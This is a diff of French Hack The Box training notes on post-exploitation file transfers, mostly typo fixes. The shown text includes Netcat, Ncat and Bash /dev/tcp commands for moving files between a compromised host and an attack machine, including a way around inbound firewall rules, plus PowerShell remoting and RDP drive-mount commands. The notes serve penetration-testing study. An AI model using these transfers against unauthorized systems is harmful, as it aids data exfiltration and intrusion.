@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-26T16:29:05.182Z
+date: 2025-04-26T16:31:03.290Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -638,7 +638,7 @@ Cette partie va présenter les méthodes de transfert alternatives.
 ### Netcat
 
 Netcat (abrégé nc) est un outil qui permet de lire et d'écrire vers des connexions réseau avec TCP ou UDP.
-Il peut donc aussi être utilisé pour transferer des fichiers.
+Il peut donc aussi être utilisé pour transférer des fichiers.
 
 La version originale de Netcat à été [publié](http://seclists.org/bugtraq/1995/Oct/0028.html) par Hobbit en 1995, mais n'a pas été maintenue. L'utilité de cet outil a poussé le projet Nmap à produire un outil appellé [Ncat](https://nmap.org/ncat/), cet outil présente une implémentation moderne de Netcat, avec un support pour le SSL, IPv6, SOCKS, proxy HTTP, etc.
 
@@ -652,7 +652,6 @@ Avec **Netcat**, Écoute sur le port spécifié et envoi la réponse vers un fic
 ```
 nc -l -p <port> > <fichier>
 ```
-
 
 Avec **Ncat**, Écoute sur le port spécifié et envoi la réponse vers un fichier:
 (l'option `--recv-only` termine la connexion une fois la réponse reçue)
@@ -683,21 +682,25 @@ Nous allons voir comment la machine cible peut initier la connexion.
 Au lieu d'écouter sur la machine compromise, on peut se connecter à un port de la machine d'attaque pour transférer le contenu du fichier, ce qui est utile si un pare-feu bloque les connexions entrantes.
 
 Avec **Netcat**, Écoute sur le port spécifié et envoi le contenu du fichier lors des connexions:
+
 ```
 sudo nc -l -p <port> -q 0 < <fichier>
 ```
 
 Avec **Netcat**, se connecter et envoi la réponse dans un fichier:
+
 ```
 nc <adresse> <port> > <fichier>
 ```
 
 Avec **Ncat**, Écoute sur le port spécifié et envoi le contenu du fichier lors des connexions:
+
 ```
 sudo ncat -l -p <port> --send-only < <fichier>
 ```
 
 Avec **Ncat**, se connecter et envoi la réponse dans un fichier:
+
 ```
 ncat <adresse> <port> --recv-only > <fichier>
 ```
@@ -705,9 +708,9 @@ ncat <adresse> <port> --recv-only > <fichier>
 ---
 
 Si Ncat ou Netcat n'est pas disponible, Bash supporte les opérations en lecture/écriture vers [/dev/tcp](https://tldp.org/LDP/abs/html/devref1.html).
-Cela permet aussi d'envoyer ou de transferer des fichiers.
+Cela permet aussi d'envoyer ou de transférer des fichiers.
 
-Écrire vers ce fichier permet au shell d'ouvrir une connection TCP vers `hôte:port`.
+Écrire vers ce fichier permet au shell d'ouvrir une connexion TCP vers `hôte:port`.
 
 Après avoir créer un listener qui envoi le contenu du fichier lors des connexions:
 
@@ -717,29 +720,33 @@ cat < /dev/tcp/<adresse>/<port> > <fichier>
 
 ### PowerShell Session File Transfer
 
-Si HTTP, HTTPS ou SMB sont indisponibles, on peut utiliser [PowerShell Remoting (WinRM)](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) pour transférer des fichiers, cette fonction permet aussi d'exécuter des scripts avec des sessions PowerShell distantes. 
+Si HTTP, HTTPS ou SMB sont indisponibles, on peut utiliser [PowerShell Remoting (WinRM)](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) pour transférer des fichiers, cette fonction permet aussi d'exécuter des scripts avec des sessions PowerShell distantes.
 
 Cette méthode nécessite des droits administratifs (membre du groupe d'utilisateurs distants).
 
-Par défaut, activer le Powershell Remoting crée deux listener: HTTP (port 5985) et HTTPS (port 5986).
+Par défaut, activer le PowerShell Remoting crée deux listener: HTTP (port 5985) et HTTPS (port 5986).
 
 Pour tester la connexion distante avec WinRM il est possible d'utiliser `Test-NetConnection`:
+
 ```
 Test-NetConnection -ComputerName <ordinateur> -Port <port (5985/5986 par défaut)>
 ```
 
 Pour créer une session WinRM il est possible d'utiliser `New-PSSession`:
 Dans notre cas, la session sera stockée dans une variable pour un accès ultérieur.
+
 ```
 $Session = New-PSSession -ComputerName <ordinateur>
 ```
 
 Pour copier un fichier vers un ordinateur distant à l'aide d'une session:
+
 ```
 Copy-Item -Path <fichier> -ToSession $Session -Destination <répertoire>
 ```
 
 Pour copier un fichier depuis un ordinateur distant à l'aide d'une session:
+
 ```
 Copy-Item -Path <fichier> -FromSession $Session -Destination <répertoire>
 ```
@@ -751,11 +758,13 @@ Il est possible de copier/coller des fichiers et dossiers une fois une session r
 Si jamais cette fonctionnalité ne fonctionne pas, il est possible d'exposer des dossiers locaux dans la session rdp.
 
 Pour monter un répertoire Linux dans la session avec rdesktop:
+
 ```
 rdesktop <adresse> -d <domaine> -u <utilisateur> -p '<mot de passe>' -r disk:<nom disque>='<répertoire local>'
 ```
 
 Pour monter un répertoire Linux dans la session avec xfreerdp:
+
 ```
 xfreerdp /v:<adresse> /d:<domaine> /u:<utilisateur> /p:'<mot de passe>' /drive:<nom disque>,<répertoire local>
 ```
@@ -764,14 +773,6 @@ Ces répertoires sont désormais accessibles depuis `\\tsclient\`.
 
 Avec le client officiel [mstsc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc), il est aussi possible de partager des répertoires (Local Ressources > Drives > disque souhaité).
 
+Ces lecteurs ne sont accessibles à aucun autre utilisateur sur la machine cible, même en cas de détournement de la session RDP.
 
-
-
-
-
-
-
-
-
-
-
+## Protected File Transfers
